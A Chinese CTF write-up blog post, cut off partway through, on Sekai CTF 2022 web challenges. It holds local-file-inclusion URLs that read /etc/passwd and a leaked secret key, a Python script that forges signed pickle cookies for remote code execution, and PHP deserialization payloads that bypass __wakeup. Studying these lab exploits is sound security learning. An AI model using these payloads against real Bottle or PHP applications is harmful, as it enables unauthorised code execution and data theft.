{"title":"Sekai CTF 2022","uid":"ba0cf5d51c9ce53698d64b464314f97e","slug":"2022SekaiCTF","date":"2023-02-13T15:13:06.374Z","updated":"2023-08-06T08:02:12.273Z","comments":true,"path":"api/articles/2022SekaiCTF.json","keywords":null,"cover":"/img/42.jpg","content":"<p><code>国外比赛难度确实逆天</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"Sekai-CTF-2022\"><a href=\"#Sekai-CTF-2022\" class=\"headerlink\" title=\"Sekai CTF 2022\"></a>Sekai CTF 2022</h1><p><a href=\"https://github.com/project-sekai-ctf/sekaictf-2022\">https://github.com/project-sekai-ctf/sekaictf-2022</a></p>\n<p>这是官方的<code>wp</code>和题目的<code>docker</code>，我后面还是把<code>web</code>都复现一下</p>\n<p><img src=\"/post/2022SekaiCTF/image-20221003101420158.png\" alt=\"image-20221003101420158\"></p>\n<p><code>大比赛，每个题要么难出头，要么感觉就差一点，与大佬的差距，鼠鼠只能赛后复现wp了</code></p>\n<p><img src=\"/post/2022SekaiCTF/image-20221003104433566.png\" alt=\"image-20221003104433566\"></p>\n<p><code>这是web难度【看起来就是按解题人数来分】</code></p>\n<h2 id=\"1-bottle-poem-后续学习了，补上自己的思路\"><a href=\"#1-bottle-poem-后续学习了，补上自己的思路\" class=\"headerlink\" title=\"1.bottle-poem[后续学习了，补上自己的思路]\"></a>1.bottle-poem[后续学习了，补上自己的思路]</h2><pre class=\"line-numbers language-py\"><code class=\"language-py\">hint：\n\nCome and read poems in the bottle.\n\nNo bruteforcing is required to solve this challenge. Please do not use scanner tools. Rate limiting is applied. Flag is executable on server.\n\n翻译：\n\n快来读一读瓶中的诗吧。\n\n解决这一挑战不需要暴力破解。请不要使用扫描仪工具。应用速率限制。标志在服务器上是可执行的。\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这道题我已经秃头了，开始觉得是单纯的文件包含，但是后面看到官方发的wp，感觉又没那么简单</p>\n<p>我先直接展示官方的wp，然后再展示我复现的过程</p>\n<pre class=\"line-numbers language-py\"><code class=\"language-py\">Hey guys Thx for attending SekaiCTF  i made two challenges for this competition one is bottle poem another is sekaigame start\n\nfor the bottle poem most of people think its guessy and at the start the challenge always down  so say sorry to u and respect to my buddy hfz that he fix this challenge \n\nhere is my short wp\n-----------------\nit's easy to find that this website has LFI\nu wanna to  read file directly but failed \nthat's not show u that we hide it  that means u havent enough execute permission to read it (so we update description that flag is executable and u dont need some bruteforcing or guessing)flag is in the common path /flag\n\nso we need to read source\njust like this\n\nhttp://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/app.py\n\nso dont need to bruteforce proc/self/ just use it to got sourcecode\n\nuse this way u can read the secret --sekai\n\nhttp://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/config/secret.py\n\nnow u can control the cookies but if u read something just like /views/admin.html or just make guest to admin u would find its a troll \n\nso u need rce truely if u search some documentation will find the bottle's cookie_decode() will unpickle so use this to get rce\nhttps://github.com/bottlepy/bottle/issues/900\n\nhere the steps\n1.lfi to read file and    secret\n2.use cookie pickle rce to reverse a shell\n3.execute /flag to get flag\n---------\nand my exp \n-------------\ndemo exp\nimport base64,hashlib,pickle,hmac\nimport os\ndef tob(s, enc='utf8'):\n    if isinstance(s, str):\n        return s.encode(enc)\n    return b'' if s is None else bytes(s)\n\n\ndef cookie_encode(data, key):\n    ''' Encode and sign a pickle-able object. Return a (byte) string '''\n    msg = base64.b64encode(pickle.dumps(data, 0))\n    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())\n    return tob('!') + sig + tob('?') + msg\n\nclass test():\n    def __reduce__(self):\n        return (eval,('__import__(\"os\").popen(\"command\")',))\n\n\nobj = test()\na = cookie_encode(obj,'Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu')\nprint(a)\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>翻译</p>\n<pre><code>大家好，感谢参加 SekaiCTF 我为这次比赛提出了两个挑战，一个是瓶子诗，另一个是 sekaigame start\n\n对于瓶子诗，大多数人认为它是猜测性的，一开始挑战总是失败，所以向你说声抱歉，并尊重我的好友 hfz，他解决了这个挑战\n\n这是我的简短 wp\n-----------------\n很容易发现这个网站有LFI（本地文件包含）\n你想直接读取文件但失败了\n这并没有告诉你我们隐藏它，这意味着你没有足够的执行权限来读取它（所以我们更新了标志是可执行的并且你不需要一些暴力破解或猜测的描述）标志在公共路径/标志中\n\n所以我们需要阅读源码\n像这样\n\nhttp://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/app.py\n\n所以不需要蛮力 proc/self/ 只需使用它来获取源代码\n\n使用这种方式你可以阅读秘密--sekai\n\nhttp://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/config/secret.py\n\n现在您可以控制 cookie，但如果您阅读 /views/admin.html 之类的内容，或者只是让访客成为管理员，您会发现它是一个巨魔（可以理解为恶搞）\n\n所以你真的需要 rce 如果你搜索一些文档会发现瓶子的 cookie_decode() 会解开所以用它来获取 rce\nhttps://github.com/bottlepy/bottle/issues/900\n\n这里的步骤\n1.lfi读取文件和秘密\n2.使用cookie pickle rce 反弹一个shell\n3.执行/flag获取flag\n</code></pre>\n<p>官方<code>exp</code></p>\n<pre class=\"line-numbers language-python\"><code class=\"language-python\">demo exp\n<span class=\"token keyword\">import</span> base64<span class=\"token punctuation\">,</span>hashlib<span class=\"token punctuation\">,</span>pickle<span class=\"token punctuation\">,</span>hmac\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">def</span> <span class=\"token function\">tob</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> enc<span class=\"token operator\">=</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> isinstance<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> b<span class=\"token string\">''</span> <span class=\"token keyword\">if</span> s <span class=\"token keyword\">is</span> None <span class=\"token keyword\">else</span> bytes<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cookie_encode</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">''' Encode and sign a pickle-able object. Return a (byte) string '''</span>\n    msg <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    sig <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>hmac<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>tob<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> digestmod<span class=\"token operator\">=</span>hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> tob<span class=\"token punctuation\">(</span><span class=\"token string\">'!'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> sig <span class=\"token operator\">+</span> tob<span class=\"token punctuation\">(</span><span class=\"token string\">'?'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> msg\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>eval<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token string\">'__import__(\"os\").popen(\"command\")'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\nobj <span class=\"token operator\">=</span> test<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\na <span class=\"token operator\">=</span> cookie_encode<span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span><span class=\"token string\">'Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<hr>\n<p>下面是我复现理解操作</p>\n<p>先打开网站，看到有三个可以打开的链接</p>\n<p><img src=\"/post/2022SekaiCTF/image-20221003201506807.png\" alt=\"image-20221003201506807\"></p>\n<p>先看看源码</p>\n<p><img src=\"/post/2022SekaiCTF/image-20221003201547093.png\" alt=\"image-20221003201547093\"></p>\n<p>发现没什么额外的信息，三个链接是对应着三个文本文件</p>\n<p>看起来似乎是文件包含的题</p>\n<pre><code>http://bottle-poem.ctf.sekai.team/show?id=spring.txt\n</code></pre>\n<p><img src=\"/post/2022SekaiCTF/image-20221003202543907.png\" alt=\"image-20221003202543907\"></p>\n<p>我们试试能不能显示其他信息，我在做的时候试的是<code>/etc/passwd</code></p>\n<pre><code>http://bottle-poem.ctf.sekai.team/show?id=/etc/passwd\n</code></pre>\n<p><img src=\"/post/2022SekaiCTF/image-20221003202814644.png\" alt=\"image-20221003202814644\"></p>\n<p>看来是方向对了，确实是可以包含本地文件并显示，但是没有其他信息能利用</p>\n<h3 id=\"查看当前进程的启动命令\"><a href=\"#查看当前进程的启动命令\" class=\"headerlink\" title=\"*查看当前进程的启动命令\"></a>*查看当前进程的启动命令</h3><p>这个是看最后发的<code>wp</code>，学到了</p>\n<pre><code>/proc/self/cmdline\n\n//该文件包含的是该进程的命令行参数，包括进程的启动路径(argv[0])\n</code></pre>\n<p>然后会下载一个名叫<code>show</code>的文件</p>\n<pre><code>python3 -u /app/app.py \n</code></pre>\n<p>在命令中，我们发现运行了一个<code>/app/app.py</code>的文件</p>\n<p>看来这就是我们网站启动的脚本，里面就有我们网站的源码</p>\n<pre><code>http://bottle-poem.ctf.sekai.team/show?id=/app/app.py\n</code></pre>\n<p>查看到文件源码</p>\n<pre class=\"line-numbers language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> bottle <span class=\"token keyword\">import</span> route<span class=\"token punctuation\">,</span> run<span class=\"token punctuation\">,</span> template<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">,</span> error\n<span class=\"token keyword\">from</span> config<span class=\"token punctuation\">.</span>secret <span class=\"token keyword\">import</span> sekai\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> re\n\n\n@route<span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">home</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> template<span class=\"token punctuation\">(</span><span class=\"token string\">\"index\"</span><span class=\"token punctuation\">)</span>\n\n\n@route<span class=\"token punctuation\">(</span><span class=\"token string\">\"/show\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    response<span class=\"token punctuation\">.</span>content_type <span class=\"token operator\">=</span> <span class=\"token string\">\"text/plain; charset=UTF-8\"</span>\n    param <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>id\n    <span class=\"token keyword\">if</span> re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">\"^../app\"</span><span class=\"token punctuation\">,</span> param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"No!!!!\"</span>\n    requested_path <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>getcwd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"/poems\"</span><span class=\"token punctuation\">,</span> param<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">with</span> open<span class=\"token punctuation\">(</span>requested_path<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n            tfile <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"No This Poems\"</span>\n    <span class=\"token keyword\">return</span> tfile\n\n\n@error<span class=\"token punctuation\">(</span><span class=\"token number\">404</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">error404</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> template<span class=\"token punctuation\">(</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">)</span>\n\n\n@route<span class=\"token punctuation\">(</span><span class=\"token string\">\"/sign\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        session <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>get_cookie<span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">,</span> secret<span class=\"token operator\">=</span>sekai<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token operator\">not</span> session <span class=\"token operator\">or</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"guest\"</span><span class=\"token punctuation\">:</span>\n            session <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"guest\"</span><span class=\"token punctuation\">}</span>\n            response<span class=\"token punctuation\">.</span>set_cookie<span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> secret<span class=\"token operator\">=</span>sekai<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> template<span class=\"token punctuation\">(</span><span class=\"token string\">\"guest\"</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span>session<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> template<span class=\"token punctuation\">(</span><span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span>session<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"pls no hax\"</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    os<span class=\"token punctuation\">.</span>chdir<span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>dirname<span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">\"0.0.0.0\"</span><span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span><span class=\"token number\">8080</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在</p>\n<pre class=\"line-numbers language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> config<span class=\"token punctuation\">.</span>secret <span class=\"token keyword\">import</span> sekai\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>看到<code>config.secret</code>，这是个文件路径<code>/config/secret</code></p>\n<p>我们可以访问看看，能不能看到里面的内容【注意这个文件肯定是在 <code>/app</code>目录下】</p>\n<pre><code>http://bottle-poem.ctf.sekai.team/show?id=/app/config/secret.py\n</code></pre>\n<p>得到</p>\n<pre><code>sekai = &quot;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&quot;\n</code></pre>\n<hr>\n<pre><code>1. lfi 读取文件和秘密\n2. 使用 cookie pickle rce 反弹shell\n3. 执行./flag获取flag\n</code></pre>\n<p>根据官方的<code>pickle rce</code>，这个涉及新的 <code>pickle</code> 反序列化技巧</p>\n<p>【流下没技术的眼泪】可我现在只会<code>php</code>反序列化，后面补上</p>\n<hr>\n<h2 id=\"2-sekai-game-start\"><a href=\"#2-sekai-game-start\" class=\"headerlink\" title=\"2.sekai-game-start\"></a>2.sekai-game-start</h2><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Sekai_Game</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$start</span> <span class=\"token operator\">=</span> True<span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">start</span> <span class=\"token operator\">===</span> True<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string\">\"Sekai Game Start Here is your flag \"</span><span class=\"token punctuation\">.</span><span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">'FLAG'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">start</span><span class=\"token operator\">=</span>False<span class=\"token punctuation\">;</span>    \n \n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'sekai_game.run'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'sekai_game.run'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token delimiter\">?></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>看起来是到<code>反序列化</code>的题目，看起来似乎难度不大，但是我被瓶子诗卡了太久，这几天又在搞<code>DC5</code>，后面的题目发布出来都没怎么看了，早知道做一下了<code>【哭唧唧】</code></p>\n<p>我们先简单的分析一下源码内容</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\" spellcheck=\"true\">//文件包含，把当前目录flag.php文件</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Sekai_Game</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$start</span> <span class=\"token operator\">=</span> True<span class=\"token punctuation\">;</span><span class=\"token comment\" spellcheck=\"true\">//给strat变量赋值为True</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">start</span> <span class=\"token operator\">===</span> True<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string\">\"Sekai Game Start Here is your flag \"</span><span class=\"token punctuation\">.</span><span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">'FLAG'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\" spellcheck=\"true\">//getenv函数 用来获取php 环境变量</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">start</span><span class=\"token operator\">=</span>False<span class=\"token punctuation\">;</span>\n<span class=\"token comment\" spellcheck=\"true\">//这里又把start变量赋值为False，所以这里是需要绕过__wakeup魔术方法，不让其执行，只用把属性个数改得大于原来就行</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'sekai_game.run'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'sekai_game.run'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\" spellcheck=\"true\">//这里就是序列化的变量，变量名为sekai_game.run</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token delimiter\">?></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>然后我们整理一下</p>\n<p>得到我们的序列化的<code>php</code>代码</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Sekai_Game</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$start</span> <span class=\"token operator\">=</span> True<span class=\"token punctuation\">;</span>  \n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Sekai_Game</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter\">?></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>运行得到序列化结果</p>\n<pre><code>O:10:&quot;Sekai_Game&quot;:1:&#123;s:5:&quot;start&quot;;b:1;&#125;\n</code></pre>\n<p>我们修改一下属性值</p>\n<pre><code>O:10:&quot;Sekai_Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;\n</code></pre>\n<p><code>【苦笑】但实际是不行的</code></p>\n<h3 id=\"关键考点\"><a href=\"#关键考点\" class=\"headerlink\" title=\"关键考点\"></a>关键考点</h3><p>但是</p>\n<p><img src=\"/post/2022SekaiCTF/image-20221003135130855.png\" alt=\"image-20221003135130855\"></p>\n<pre><code>PhP 变量不能使用 . ，但是这个变量名很特殊：sekai_game.run. 它同时具有 _ 和 . \n\nphp默认将.所有参数名称转换为_，因为版本早于8，有一种方法可以解决这个问题，使用[ ，php忽略所有 . ，只转换[为_参数 ==&gt; ?sekai[game.run=\n\n**学到了**\n</code></pre>\n<p>所以有效的<code>payload</code>为</p>\n<pre><code>url/?sekai[game.run=xxx\n</code></pre>\n<p>第二步是绕过<code>__wakeup</code></p>\n<pre><code>这里我用\nO:10:&quot;Sekai_Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;\n\n实际还是绕不过__wakeup函数，就算是属性个数大于原来的属性个数\n\n==&gt;网上找了以后，发现这个方法是有局限性的，对于高版本的php，这样是无法绕过__wakeup()\n----\n\n对于高版本的php\n可以用C:来绕过\n\n原理是C:代表这个类实现了serializeable接口，而serializeable不支持__wakeup，就绕过去了\n==&gt;\nC:10:&quot;Sekai_Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;\n\n\n但是因为源码中已经赋值，所以不填写数据，\n只用实例化Sekai_Game类\n</code></pre>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Sekai_Game</span><span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Sekai_Game</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token 